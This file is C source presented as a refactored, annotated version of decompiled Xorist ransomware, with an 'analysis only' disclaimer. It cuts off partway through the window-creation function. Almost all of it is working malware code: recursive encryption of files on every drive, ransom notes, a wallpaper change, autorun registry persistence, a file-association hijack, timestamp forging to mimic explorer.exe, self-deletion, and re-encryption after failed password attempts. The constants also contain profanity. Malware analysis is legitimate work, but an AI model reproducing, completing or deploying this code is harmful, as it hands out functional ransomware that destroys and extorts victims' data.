/* 
 * Xorist Ransomware - Refactored and Annotated
 * Original: Trojan-Ransom.Win32.Xorist.lk
 * 
 * This is a REFACTORED VERSION of decompiled ransomware code for ANALYSIS PURPOSES ONLY
 * DO NOT compile, distribute, or use this code maliciously
 */

#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>

//=============================================================================
// CONSTANTS AND CONFIGURATION
//=============================================================================

#define WINDOW_CLASS_NAME       "0p3nSOurc3 X0r157, motherfucker!"
#define RESOURCE_NAME           "pussylicker"
#define RANSOM_NOTE_FILENAME    "HOW TO DECRYPT FILES.txt"
#define AUTORUN_REGISTRY_KEY    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define AUTORUN_VALUE_NAME      "Alcmeter"
#define TEMP_EXECUTABLE_NAME    "explorer.exe"
#define CRYPTED_MESSAGE         "CRYPTED!"
#define WINDOW_TITLE            "Attention!"
#define FONT_NAME               "Tahoma"

// UI Control IDs
#define ID_BUTTON_DECRYPT       500
#define ID_BUTTON_EXIT          501
#define ID_BUTTON_INFO          502
#define ID_EDIT_PASSWORD        700

// Encryption constants
#define TEA_DELTA               0x9E3779B9  // TEA encryption constant
#define BLOCK_SIZE_BYTES        8
#define KEY_SIZE_BYTES          16
#define MD5_HASH_SIZE           16

//=============================================================================
// GLOBAL VARIABLES
//=============================================================================

// Encryption keys and configuration
BYTE g_xorKey[16];                      // XOR encryption key
BYTE g_teaKey[16];                      // TEA encryption key
BYTE g_passwordHash[16];                // MD5 hash of correct password
BYTE g_encryptedExtension[16];          // Encrypted file extension
BYTE g_registryKeyName[16];             // Registry key for file association

// File operation buffers
CHAR g_currentFilePath[1280];
CHAR g_tempBuffer[512];
CHAR g_fileSearchPattern[512];
CHAR g_targetPath[512];
CHAR g_moduleFileName[1278];
CHAR g_searchString[512];
CHAR g_newFilePath[2560];
CHAR g_dropperFileName[512];
CHAR g_shellParameters[1280];
CHAR g_desktopWallpaper[512];
CHAR g_ransomNoteContent[512];
CHAR g_explorerPath[512];

// File handles and sizes
HANDLE g_currentFile = NULL;
DWORD g_fileSize = 0;
LPVOID g_fileBuffer = NULL;
DWORD g_bufferSize = 0;
HANDLE g_processHeap = NULL;

// Encryption state
DWORD g_teaRounds = 32;
LONG g_encryptionOffset = 0;
DWORD g_encryptionSize = 0;

// Configuration flags (loaded from resources)
BOOL g_isEncryptionMode = FALSE;        // TRUE = encrypt, FALSE = decrypt
BOOL g_dropRansomNote = TRUE;
BOOL g_showMessageBox = TRUE;
BOOL g_useAdvancedEncryption = FALSE;   // TEA vs simple XOR
BOOL g_addToAutorun = TRUE;
int g_maxPasswordAttempts = 3;

// UI elements
HWND g_mainWindow = NULL;
HWND g_editPassword = NULL;
HWND g_buttonDecrypt = NULL;
HWND g_buttonInfo = NULL;
HWND g_buttonExit = NULL;
HINSTANCE g_hInstance = NULL;
WPARAM g_fontHandle = 0;

// File attributes for stealth
FILETIME g_explorerCreationTime;
FILETIME g_explorerLastAccessTime;
FILETIME g_explorerLastWriteTime;

// Ransom note and messages
LPCSTR g_ransomNoteText = NULL;
LPCSTR g_targetFileExtension = NULL;
int g_remainingAttempts = 0;

// File type filter list (from resources)
DWORD g_fileTypeCount = 0;
LPSTR g_fileTypeFilters = NULL;

//=============================================================================
// ENCRYPTION FUNCTIONS
//=============================================================================

/**
 * MD5 hashing function using Windows Crypto API
 */
BOOL ComputeMD5Hash(BYTE *input, DWORD inputLength, BYTE *output, DWORD outputSize)
{
    HCRYPTPROV hCryptProv = 0;
    HCRYPTHASH hHash = 0;
    BOOL result = FALSE;

    if (CryptAcquireContextA(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
    {
        if (CryptCreateHash(hCryptProv, CALG_MD5, 0, 0, &hHash))
        {
            CryptHashData(hHash, input, inputLength, 0);
            CryptGetHashParam(hHash, HP_HASHVAL, output, &outputSize, 0);
            CryptDestroyHash(hHash);
            result = TRUE;
        }
        CryptReleaseContext(hCryptProv, 0);
    }

    return result;
}

/**
 * Simple XOR encryption/decryption with key
 */
void XorEncryptDecrypt(char *data, int dataLength, BYTE *key, int keyLength)
{
    for (int i = 0; i < dataLength; i++)
    {
        data[i] ^= key[i % keyLength];
    }
}

/**
 * Convert big-endian to little-endian for TEA algorithm
 */
void PrepareTeaKey(unsigned int *keyInput)
{
    unsigned int *key = (unsigned int *)g_teaKey;
    
    key[0] = _byteswap_ulong(keyInput[0]);
    key[1] = _byteswap_ulong(keyInput[1]);
    key[2] = _byteswap_ulong(keyInput[2]);
    key[3] = _byteswap_ulong(keyInput[3]);
}

/**
 * TEA (Tiny Encryption Algorithm) - Encrypt block
 */
unsigned int TeaEncryptBlock(unsigned int *plaintext, unsigned int *ciphertext)
{
    unsigned int sum = 0;
    unsigned int v0 = _byteswap_ulong(plaintext[0]);
    unsigned int v1 = _byteswap_ulong(plaintext[1]);
    unsigned int *key = (unsigned int *)g_teaKey;

    for (int i = 0; i < g_teaRounds; i++)
    {
        sum -= TEA_DELTA;
        v0 += ((key[1] + (v1 >> 5)) ^ (sum + v1) ^ (key[0] + (v1 << 4)));
        v1 += ((key[3] + (v0 >> 5)) ^ (sum + v0) ^ (key[2] + (v0 << 4)));
    }

    ciphertext[0] = _byteswap_ulong(v0);
    ciphertext[1] = _byteswap_ulong(v1);
    
    return ciphertext[0];
}

/**
 * TEA (Tiny Encryption Algorithm) - Decrypt block
 */
unsigned int TeaDecryptBlock(unsigned int *ciphertext, unsigned int *plaintext)
{
    unsigned int sum = TEA_DELTA * g_teaRounds;
    unsigned int v0 = _byteswap_ulong(ciphertext[0]);
    unsigned int v1 = _byteswap_ulong(ciphertext[1]);
    unsigned int *key = (unsigned int *)g_teaKey;

    for (int i = 0; i < g_teaRounds; i++)
    {
        v1 -= ((key[3] + (v0 >> 5)) ^ (sum + v0) ^ (key[2] + (v0 << 4)));
        v0 -= ((key[1] + (v1 >> 5)) ^ (sum + v1) ^ (key[0] + (v1 << 4)));
        sum += TEA_DELTA;
    }

    plaintext[0] = _byteswap_ulong(v0);
    plaintext[1] = _byteswap_ulong(v1);
    
    return plaintext[0];
}

/**
 * Simple 4-byte XOR encryption (alternative to TEA)
 */
unsigned int SimpleXorEncrypt(unsigned int bufferSize)
{
    unsigned int blockCount = bufferSize >> 2;
    unsigned int *buffer = (unsigned int *)g_fileBuffer;
    unsigned int *xorKeys = (unsigned int *)g_xorKey;
    
    if (blockCount > 0)
    {
        if (bufferSize != g_encryptionSize)
            blockCount++;
            
        int keyIndex = 0;
        for (unsigned int i = 0; i < blockCount; i++)
        {
            if (keyIndex == 4)
                keyIndex = 0;
            buffer[i] ^= xorKeys[keyIndex++];
        }
    }
    
    return buffer[blockCount - 1];
}

/**
 * TEA encryption for entire buffer
 */
unsigned int TeaEncryptBuffer(unsigned int bufferSize)
{
    unsigned int blockCount = bufferSize >> 3;  // Divide by 8
    unsigned int *buffer = (unsigned int *)g_fileBuffer;
    
    if (blockCount > 0)
    {
        for (unsigned int i = 0; i < blockCount; i++)
        {
            TeaEncryptBlock(&buffer[i * 2], &buffer[i * 2]);
        }
    }
    
    return bufferSize;
}

/**
 * TEA decryption for entire buffer
 */
unsigned int TeaDecryptBuffer(unsigned int bufferSize)
{
    unsigned int blockCount = bufferSize >> 3;  // Divide by 8
    unsigned int *buffer = (unsigned int *)g_fileBuffer;
    
    if (blockCount > 0)
    {
        for (unsigned int i = 0; i < blockCount; i++)
        {
            TeaDecryptBlock(&buffer[i * 2], &buffer[i * 2]);
        }
    }
    
    return bufferSize;
}

//=============================================================================
// FILE ENCRYPTION/DECRYPTION FUNCTIONS
//=============================================================================

/**
 * Generate per-file encryption key based on filename
 */
void GenerateFileKey(LPCSTR filePath, BYTE *outputKey)
{
    LPSTR fileName = PathFindFileNameA(filePath);
    BYTE firstChar = fileName[0];
    
    // Derive key from first character of filename
    for (int i = 0; i < KEY_SIZE_BYTES; i++)
    {
        BYTE keyByte = ((BYTE *)g_teaKey)[i];
        outputKey[i] = firstChar ^ keyByte;
        firstChar = _rotl8(firstChar, 1);  // Rotate left by 1 bit
    }
}

/**
 * Encrypt or decrypt a single file
 */
BOOL ProcessFile(LPCSTR originalPath, LPCSTR newPath, BOOL isEncryption)
{
    HANDLE hFile;
    DWORD fileSize, bytesRead, bytesWritten;
    BYTE fileKey[KEY_SIZE_BYTES];
    FILETIME creationTime, lastAccessTime, lastWriteTime;
    
    // Open the file
    hFile = CreateFileA(originalPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 
                       NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;
    
    // Get file size
    fileSize = GetFileSize(hFile, NULL);
    if (fileSize < BLOCK_SIZE_BYTES)
    {
        CloseHandle(hFile);
        return FALSE;  // File too small to encrypt
    }
    
    // Store original file times for stealth
    GetFileTime(hFile, &creationTime, &lastAccessTime, &lastWriteTime);
    
    // Read the portion to encrypt/decrypt
    SetFilePointer(hFile, g_encryptionOffset, NULL, FILE_BEGIN);
    ReadFile(hFile, g_fileBuffer, g_encryptionSize, &bytesRead, NULL);
    
    if (bytesRead > 0)
    {
        // Generate file-specific key
        GenerateFileKey(originalPath, fileKey);
        
        // Apply encryption/decryption
        if (g_useAdvancedEncryption)
        {
            if (isEncryption)
                TeaEncryptBuffer(bytesRead);
            else
                TeaDecryptBuffer(bytesRead);
        }
        else
        {
            SimpleXorEncrypt(bytesRead);
        }
        
        // Write back encrypted/decrypted data
        SetFilePointer(hFile, g_encryptionOffset, NULL, FILE_BEGIN);
        WriteFile(hFile, g_fileBuffer, bytesRead, &bytesWritten, NULL);
    }
    
    // Restore file times (stealth)
    SetFileTime(hFile, &creationTime, &lastAccessTime, &lastWriteTime);
    CloseHandle(hFile);
    
    // Rename file (add or remove extension)
    MoveFileA(originalPath, newPath);
    
    return TRUE;
}

//=============================================================================
// FILE SYSTEM TRAVERSAL
//=============================================================================

/**
 * Recursively traverse directories and encrypt/decrypt files
 */
void TraverseAndProcessFiles(LPCSTR basePath)
{
    WIN32_FIND_DATAA findData;
    HANDLE hFind;
    CHAR searchPath[MAX_PATH];
    CHAR fullPath[MAX_PATH];
    CHAR newFilePath[MAX_PATH];
    BOOL shouldProcess;
    
    // Create search pattern
    lstrcpyA(searchPath, basePath);
    lstrcatA(searchPath, "\\*");
    
    hFind = FindFirstFileA(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE)
        return;
    
    do
    {
        // Process messages to keep UI responsive
        ProcessWindowMessages();
        
        // Skip "." and ".."
        if (lstrcmpA(findData.cFileName, ".") == 0 || 
            lstrcmpA(findData.cFileName, "..") == 0)
            continue;
        
        // Build full path
        lstrcpyA(fullPath, basePath);
        lstrcatA(fullPath, "\\");
        lstrcatA(fullPath, findData.cFileName);
        
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            // Recursively process subdirectory
            if (g_dropRansomNote)
                DropRansomNote(fullPath);
            TraverseAndProcessFiles(fullPath);
        }
        else
        {
            // Skip special files
            if (lstrcmpiA(RANSOM_NOTE_FILENAME, findData.cFileName) == 0 ||
                lstrcmpiA(g_desktopWallpaper, findData.cFileName) == 0)
                continue;
            
            // Check if file matches target extensions
            shouldProcess = FALSE;
            if (g_isEncryptionMode)
            {
                // Encryption mode: check against file type filters
                LPCSTR filter = g_fileTypeFilters;
                for (DWORD i = 0; i < g_fileTypeCount; i++)
                {
                    if (PathMatchSpecA(fullPath, filter))
                    {
                        shouldProcess = TRUE;
                        break;
                    }
                    filter += lstrlenA(filter) + 1;
                }
            }
            else
            {
                // Decryption mode: only process files with ransom extension
                shouldProcess = PathMatchSpecA(fullPath, g_fileSearchPattern);
            }
            
            if (shouldProcess)
            {
                // Build new filename
                lstrcpyA(newFilePath, fullPath);
                
                if (g_isEncryptionMode)
                {
                    // Add extension
                    lstrcatA(newFilePath, ".");
                    lstrcatA(newFilePath, g_targetFileExtension);
                }
                else
                {
                    // Remove extension
                    *PathFindExtensionA(newFilePath) = '\0';
                }
                
                // Encrypt or decrypt the file
                ProcessFile(fullPath, newFilePath, g_isEncryptionMode);
            }
        }
        
    } while (FindNextFileA(hFind, &findData));
    
    FindClose(hFind);
}

/**
 * Start encryption/decryption on all logical drives
 */
void ScanAllDrives(BOOL encryptMode)
{
    DWORD logicalDrives;
    CHAR drivePath[8];
    
    g_isEncryptionMode = encryptMode;
    
    // Build file search pattern
    lstrcpyA(g_fileSearchPattern, "*.");
    lstrcatA(g_fileSearchPattern, g_targetFileExtension);
    
    // Disable error dialogs
    SetErrorMode(SEM_FAILCRITICALERRORS);
    
    // Get all logical drives
    logicalDrives = GetLogicalDrives();
    
    // Scan from Z: to A:
    for (int i = 25; i >= 0; i--)
    {
        if (logicalDrives & (1 << i))
        {
            // Build drive path (e.g., "C:\*")
            drivePath[0] = (CHAR)(i + 'A');
            drivePath[1] = ':';
            drivePath[2] = '\\';
            drivePath[3] = '*';
            drivePath[4] = '\0';
            
            TraverseAndProcessFiles(drivePath);
        }
    }
}

//=============================================================================
// RANSOM NOTE AND WALLPAPER
//=============================================================================

/**
 * Drop ransom note in specified directory
 */
void DropRansomNote(LPCSTR directoryPath)
{
    CHAR notePath[MAX_PATH];
    HANDLE hFile;
    DWORD bytesWritten, noteLength;
    
    // Build full path to ransom note
    lstrcpyA(notePath, directoryPath);
    PathAddBackslashA(notePath);
    lstrcatA(notePath, RANSOM_NOTE_FILENAME);
    
    // Check if note already exists
    if (GetFileAttributesA(notePath) != INVALID_FILE_ATTRIBUTES)
        return;  // Already exists
    
    // Create ransom note file
    hFile = CreateFileA(notePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return;
    
    // Write ransom note content
    noteLength = lstrlenA(g_ransomNoteText);
    WriteFile(hFile, g_ransomNoteText, noteLength, &bytesWritten, NULL);
    
    // Set file times to match explorer.exe (stealth)
    SetFileTime(hFile, &g_explorerCreationTime, &g_explorerLastAccessTime, &g_explorerLastWriteTime);
    
    CloseHandle(hFile);
}

/**
 * Change desktop wallpaper to embedded bitmap
 */
void ChangeDesktopWallpaper(void)
{
    HRSRC hResource;
    DWORD resourceSize;
    HGLOBAL hResData;
    LPVOID resourceData;
    HANDLE hFile;
    DWORD bytesWritten;
    CHAR wallpaperPath[MAX_PATH];
    CHAR randomName[17];
    
    // Generate random filename for wallpaper
    for (int i = 0; i < 16; i++)
    {
        unsigned __int64 tsc = __rdtsc();
        randomName[i] = ((tsc & 0xF0) >> 4) + 'a';
    }
    randomName[16] = '\0';
    lstrcatA(randomName, ".bmp");
    
    // Get temp path
    GetTempPathA(MAX_PATH, wallpaperPath);
    lstrcatA(wallpaperPath, randomName);
    
    // Load bitmap resource
    hResource = FindResourceA(NULL, RESOURCE_NAME, RT_BITMAP);
    if (!hResource)
        return;
    
    resourceSize = SizeofResource(NULL, hResource);
    if (!resourceSize)
        return;
    
    hResData = LoadResource(NULL, hResource);
    if (!hResData)
        return;
    
    resourceData = LockResource(hResData);
    if (!resourceData)
        return;
    
    // Write bitmap to temp file
    hFile = CreateFileA(wallpaperPath, GENERIC_READ | GENERIC_WRITE, 
                       FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                       NULL, CREATE_NEW, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
        WriteFile(hFile, resourceData, resourceSize, &bytesWritten, NULL);
        SetFileTime(hFile, &g_explorerCreationTime, &g_explorerLastAccessTime, &g_explorerLastWriteTime);
        CloseHandle(hFile);
        
        // Set as desktop wallpaper
        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, wallpaperPath, 
                             SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    }
    
    FreeResource(hResData);
}

//=============================================================================
// PERSISTENCE AND REGISTRY
//=============================================================================

/**
 * Add executable to Windows startup (autorun)
 */
BOOL AddToAutorun(LPCSTR executablePath)
{
    HKEY hKey;
    DWORD disposition;
    DWORD valueLength;
    LSTATUS result;
    
    result = RegCreateKeyExA(HKEY_LOCAL_MACHINE, AUTORUN_REGISTRY_KEY, 0, "REG_SZ",
                            0, KEY_WRITE | KEY_READ, NULL, &hKey, &disposition);
    if (result != ERROR_SUCCESS)
        return FALSE;
    
    valueLength = lstrlenA(executablePath);
    RegSetValueExA(hKey, AUTORUN_VALUE_NAME, 0, REG_SZ, 
                  (const BYTE *)executablePath, valueLength);
    
    RegCloseKey(hKey);
    return TRUE;
}

/**
 * Associate encrypted file extension with executable
 */
BOOL RegisterFileExtension(void)
{
    CHAR keyPath[MAX_PATH];
    CHAR iconPath[MAX_PATH];
    
    // Register extension
    lstrcpyA(keyPath, ".");
    lstrcatA(keyPath, g_targetFileExtension);
    AddRegistryKey(HKEY_CLASSES_ROOT, keyPath, "", g_registryKeyName);
    
    // Register file type description
    AddRegistryKey(HKEY_CLASSES_ROOT, g_registryKeyName, "", CRYPTED_MESSAGE);
    
    // Set default icon
    lstrcpyA(keyPath, g_registryKeyName);
    lstrcatA(keyPath, "\\DefaultIcon");
    lstrcpyA(iconPath, g_dropperFileName);
    lstrcatA(iconPath, ",0");
    AddRegistryKey(HKEY_CLASSES_ROOT, keyPath, "", iconPath);
    
    // Set default open command
    lstrcpyA(keyPath, g_registryKeyName);
    lstrcatA(keyPath, "\\shell\\open\\command");
    AddRegistryKey(HKEY_CLASSES_ROOT, keyPath, "", g_dropperFileName);
    
    return TRUE;
}

/**
 * Remove file extension association
 */
BOOL UnregisterFileExtension(void)
{
    return RegDeleteKeyA(HKEY_CLASSES_ROOT, g_targetFileExtension) == ERROR_SUCCESS;
}

/**
 * Helper function to add registry key/value
 */
LSTATUS AddRegistryKey(HKEY hKeyParent, LPCSTR subKey, LPCSTR valueName, LPCSTR valueData)
{
    HKEY hKey;
    DWORD disposition, dataLength;
    LSTATUS result;
    
    result = RegCreateKeyExA(hKeyParent, subKey, 0, "REG_SZ", 0, 
                            KEY_WRITE | KEY_READ, NULL, &hKey, &disposition);
    if (result != ERROR_SUCCESS)
        return result;
    
    dataLength = lstrlenA(valueData);
    RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE *)valueData, dataLength);
    
    RegCloseKey(hKey);
    return ERROR_SUCCESS;
}

//=============================================================================
// CONFIGURATION LOADING
//=============================================================================

/**
 * Load configuration and keys from embedded resource
 */
BOOL LoadConfiguration(void)
{
    HRSRC hResource;
    DWORD resourceSize;
    HGLOBAL hResData;
    LPBYTE resourceData;
    LPBYTE dataPtr;
    DWORD listSize, textSize, extSize;
    
    // Find configuration resource
    hResource = FindResourceA(NULL, (LPCSTR)14, RT_BITMAP);
    if (!hResource)
        return FALSE;
    
    resourceSize = SizeofResource(NULL, hResource);
    if (!resourceSize)
        return FALSE;
    
    hResData = LoadResource(NULL, hResource);
    if (!hResData)
        return FALSE;
    
    resourceData = (LPBYTE)LockResource(hResData);
    if (!resourceData)
        return FALSE;
    
    dataPtr = resourceData;
    
    // Load XOR key (16 bytes)
    RtlMoveMemory(g_xorKey, dataPtr, 16);
    dataPtr += 16;
    
    // Decrypt the rest of the configuration
    XorEncryptDecrypt((char *)dataPtr, resourceSize - 16, g_xorKey, 16);
    
    // Load file type filter list
    listSize = *(DWORD *)dataPtr;
    dataPtr += 4;
    g_fileTypeFilters = (LPSTR)HeapAlloc(g_processHeap, HEAP_ZERO_MEMORY, listSize);
    if (!g_fileTypeFilters)
        return FALSE;
    RtlMoveMemory(g_fileTypeFilters, dataPtr, listSize);
    dataPtr += listSize;
    
    // Load ransom note text
    textSize = *(DWORD *)dataPtr;
    dataPtr += 4;
    g_ransomNoteText = (LPCSTR)HeapAlloc(g_processHeap, HEAP_ZERO_MEMORY, textSize);
    if (!g_ransomNoteText)
        return FALSE;
    RtlMoveMemory((LPVOID)g_ransomNoteText, dataPtr, textSize);
    dataPtr += textSize;
    
    // Load target file extension
    extSize = *(DWORD *)dataPtr;
    dataPtr += 4;
    g_targetFileExtension = (LPCSTR)HeapAlloc(g_processHeap, HEAP_ZERO_MEMORY, extSize);
    if (!g_targetFileExtension)
        return FALSE;
    RtlMoveMemory((LPVOID)g_targetFileExtension, dataPtr, extSize);
    dataPtr += extSize;
    
    // Load password hash (16 bytes)
    RtlMoveMemory(g_passwordHash, dataPtr, 16);
    dataPtr += 16;
    
    // Load configuration flags (5 bytes)
    RtlMoveMemory(&g_dropRansomNote, dataPtr, 5);
    dataPtr += 5;
    
    // Load TEA key (16 bytes)
    RtlMoveMemory(g_teaKey, dataPtr, 16);
    dataPtr += 16;
    
    // Load registry key name (16 bytes)
    RtlMoveMemory(g_registryKeyName, dataPtr, 16);
    dataPtr += 16;
    
    // Load max password attempts (4 bytes)
    RtlMoveMemory(&g_maxPasswordAttempts, dataPtr, 4);
    dataPtr += 4;
    
    // Load TEA rounds (4 bytes)
    RtlMoveMemory(&g_teaRounds, dataPtr, 4);
    dataPtr += 4;
    
    // Load encryption offset and size (4 + 4 bytes)
    RtlMoveMemory(&g_encryptionOffset, dataPtr, 4);
    dataPtr += 4;
    RtlMoveMemory(&g_encryptionSize, dataPtr, 4);
    
    FreeResource(hResData);
    return TRUE;
}

//=============================================================================
// DROPPER AND INSTALLATION
//=============================================================================

/**
 * Copy executable to temp directory and execute
 */
BOOL InstallDropper(void)
{
    CHAR tempPath[MAX_PATH];
    DWORD logicalDrives;
    HANDLE hFile;
    
    // Get temp directory
    GetTempPathA(MAX_PATH, tempPath);
    lstrcpyA(g_dropperFileName, tempPath);
    
    // Get current executable path
    GetModuleFileNameA(NULL, g_moduleFileName, MAX_PATH);
    
    // Build dropper path
    lstrcatA(g_dropperFileName, (LPCSTR)g_encryptedExtension);
    lstrcatA(g_dropperFileName, ".exe");
    
    // Copy file to temp
    if (!CopyFileA(g_moduleFileName, g_dropperFileName, TRUE))
        return FALSE;
    
    // Set file times to match explorer.exe (stealth)
    hFile = CreateFileA(g_dropperFileName, GENERIC_WRITE, FILE_SHARE_READ, 
                       NULL, OPEN_EXISTING, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        SetFileTime(hFile, &g_explorerCreationTime, &g_explorerLastAccessTime, 
                   &g_explorerLastWriteTime);
        CloseHandle(hFile);
    }
    
    // Add to autorun if configured
    if (g_addToAutorun)
        AddToAutorun(g_dropperFileName);
    
    // Register file extension
    RegisterFileExtension();
    
    // Start encryption on all drives
    g_isEncryptionMode = TRUE;
    ScanAllDrives(TRUE);
    
    // Drop ransom note and change wallpaper
    DropRansomNoteOnDesktop();
    ChangeDesktopWallpaper();
    
    // Cleanup
    GlobalFree(g_fileBuffer);
    ExitProcess(0);
    
    return TRUE;
}

/**
 * Drop ransom note on desktop
 */
void DropRansomNoteOnDesktop(void)
{
    CHAR desktopPath[MAX_PATH];
    
    // Get desktop folder path
    SHGetSpecialFolderPathA(NULL, desktopPath, CSIDL_DESKTOPDIRECTORY, TRUE);
    DropRansomNote(desktopPath);
    
    if (g_showMessageBox)
        MessageBoxA(NULL, g_ransomNoteText, NULL, MB_ICONERROR);
}

/**
 * Get explorer.exe file times for stealth
 */
void GetExplorerFileTime(void)
{
    CHAR explorerPath[MAX_PATH];
    HANDLE hFile;
    
    GetWindowsDirectoryA(explorerPath, MAX_PATH);
    PathAddBackslashA(explorerPath);
    lstrcatA(explorerPath, TEMP_EXECUTABLE_NAME);
    
    hFile = CreateFileA(explorerPath, GENERIC_READ, FILE_SHARE_READ, 
                       NULL, OPEN_EXISTING, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        GetFileTime(hFile, &g_explorerCreationTime, &g_explorerLastAccessTime, 
                   &g_explorerLastWriteTime);
        CloseHandle(hFile);
    }
}

/**
 * Self-delete executable after completion
 */
void SelfDelete(void)
{
    CHAR cmdPath[MAX_PATH];
    CHAR parameters[MAX_PATH];
    
    // Get command processor path
    GetEnvironmentVariableA("ComSpec", cmdPath, MAX_PATH);
    
    // Build delete command
    lstrcpyA(parameters, "/c del \"");
    lstrcatA(parameters, g_moduleFileName);
    lstrcatA(parameters, "\" >> NUL");
    
    // Execute deletion command
    ShellExecuteA(NULL, NULL, cmdPath, parameters, NULL, SW_HIDE);
}

//=============================================================================
// USER INTERFACE
//=============================================================================

/**
 * Process pending window messages (keep UI responsive during encryption)
 */
void ProcessWindowMessages(void)
{
    MSG msg;
    
    while (PeekMessageA(&msg, NULL, 0, 0, PM_REMOVE))
    {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
}

/**
 * Create window controls
 */
void CreateUIControls(HWND hWnd)
{
    HWND hControl;
    LOGFONTA logFont = {0};
    
    // Create font
    lstrcpyA(logFont.lfFaceName, FONT_NAME);
    logFont.lfHeight = -11;
    logFont.lfWeight = FW_MEDIUM;
    g_fontHandle = (WPARAM)CreateFontIndirectA(&logFont);
    
    // Password label
    hControl = CreateWindowExA(0, "STATIC", "Password:", WS_CHILD | WS_VISIBLE,
                              6, 5, 200, 17, hWnd, NULL, g_hInstance, NULL);
    SendMessageA(hControl, WM_SETFONT, g_fontHandle, TRUE);
    
    // Password edit box
    g_editPassword = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "", 
                                     WS_CHILD | WS_VISIBLE | WS_TABSTOP | ES_PASSWORD,
                                     5, 20, 285, 23, hWnd, (HMENU)ID_EDIT_PASSWORD, 
                                     g_hInstance, NULL);
    SendMessageA(g_editPassword, WM_SETFONT, g_fontHandle, TRUE);
    
    // Decrypt button
    g_buttonDecrypt = CreateWindowExA(0, "BUTTON", "OK", WS_CHILD | WS_VISIBLE,
                                      5, 50, 175, 25, hWnd, (HMENU)ID_BUTTON_DECRYPT,
                                      g_hInstance, NULL);
    SendMessageA(g_buttonDecrypt, WM_SETFONT, g_fontHandle, TRUE);
    
    // Info button
    g_buttonInfo = CreateWindowExA(0, "BUTTON", "???", WS_CHILD | WS_VISIBLE,
                                   185, 50, 50, 25, hWnd, (HMENU)ID_BUTTON_INFO,
                                   g_hInstance, NULL);
    SendMessageA(g_buttonInfo, WM_SETFONT, g_fontHandle, TRUE);
    
    // Exit button
    g_buttonExit = CreateWindowExA(0, "BUTTON", "Exit", WS_CHILD | WS_VISIBLE,
                                   240, 50, 50, 25, hWnd, (HMENU)ID_BUTTON_EXIT,
                                   g_hInstance, NULL);
    SendMessageA(g_buttonExit, WM_SETFONT, g_fontHandle, TRUE);
}

/**
 * Hash password and compare with stored hash
 */
BOOL VerifyPassword(HWND hWnd)
{
    CHAR password[257];
    BYTE passwordHash1[MD5_HASH_SIZE];
    BYTE passwordHash2[MD5_HASH_SIZE];
    DWORD passwordLength;
    
    // Get password from edit control
    passwordLength = GetDlgItemTextA(hWnd, ID_EDIT_PASSWORD, password, 257);
    if (passwordLength == 0)
        return FALSE;
    
    // Hash password multiple times (5 rounds)
    ComputeMD5Hash((BYTE *)password, passwordLength, passwordHash1, MD5_HASH_SIZE);
    ComputeMD5Hash(passwordHash1, MD5_HASH_SIZE, passwordHash2, MD5_HASH_SIZE);
    ComputeMD5Hash(passwordHash2, MD5_HASH_SIZE, passwordHash1, MD5_HASH_SIZE);
    ComputeMD5Hash(passwordHash1, MD5_HASH_SIZE, passwordHash2, MD5_HASH_SIZE);
    ComputeMD5Hash(passwordHash2, MD5_HASH_SIZE, passwordHash1, MD5_HASH_SIZE);
    
    // Compare with stored hash
    for (int i = 0; i < MD5_HASH_SIZE; i++)
    {
        if (passwordHash1[i] != g_passwordHash[i])
            return FALSE;
    }
    
    return TRUE;
}

/**
 * Main window procedure
 */
LRESULT CALLBACK WindowProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    PAINTSTRUCT ps;
    
    switch (message)
    {
        case WM_CREATE:
            // Initialize remaining attempts
            if (g_remainingAttempts == 0)
                g_remainingAttempts = g_maxPasswordAttempts;
            
            // Create UI controls
            CreateUIControls(hWnd);
            
            // Show initial message
            if (g_showMessageBox)
                MessageBoxA(NULL, g_ransomNoteText, NULL, MB_ICONERROR);
            break;
        
        case WM_COMMAND:
            switch (LOWORD(wParam))
            {
                case ID_BUTTON_DECRYPT:
                    // Check if attempts exhausted
                    if (g_remainingAttempts <= 0)
                    {
                        ScanAllDrives(TRUE);  // Re-encrypt with new key
                        UnregisterFileExtension();
                        SelfDelete();
                        ExitProcess(0);
                    }
                    
                    g_remainingAttempts--;
                    
                    // Verify password
                    if (VerifyPassword(hWnd))
                    {
                        MessageBoxA(hWnd, "Password correct! Starting decryption...", 
                                   WINDOW_TITLE, MB_ICONINFORMATION);
                        
                        // Start decryption
                        ScanAllDrives(FALSE);
                        
                        // Cleanup
                        UnregisterFileExtension();
                        SelfDelete();
                        ExitProcess(0);
                    }
                    else
                    {
                        MessageBoxA(hWnd, "Password is incorrect!", "Error!", MB_ICONERROR);
                    }
                    break;
                
                case ID_BUTTON_INFO:
                    MessageBoxA(hWnd, "All your files are encrypted!\r\n"
                               "Enter the correct password to decrypt them.",
                               WINDOW_TITLE, MB_ICONINFORMATION);
                    break;
                
                case ID_BUTTON_EXIT:
                    ExitProcess(0);
                    break;
            }
            break;
        
        case WM_PAINT:
            BeginPaint(hWnd, &ps);
            EndPaint(hWnd, &ps);
            return 0;
        
        case WM_CLOSE:
        case WM_DESTROY:
            ExitProcess(0);
            break;
    }
    
    return DefWindowProcA(hWnd, message, wParam, lParam);
}

/**
 * Calculate centered window position
 */
int CenterWindow(int windowSize, int screenSize)
{
    return (screenSize >> 1) - (windowSize >> 1);
}

/**
 * Show decryption UI window
 */
void ShowDecryptionWindow(void)
{
    WNDCLASSEXA wc = {0};
